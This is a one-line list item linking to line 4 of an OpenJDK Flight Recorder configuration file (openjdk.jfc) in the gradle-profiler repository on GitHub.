- https://github.com/gradle/gradle-profiler/blob/2eb14e031fbd48203fb05b28183decd1ee2304de/src/main/resources/org/gradle/profiler/jfr/openjdk.jfc#L4

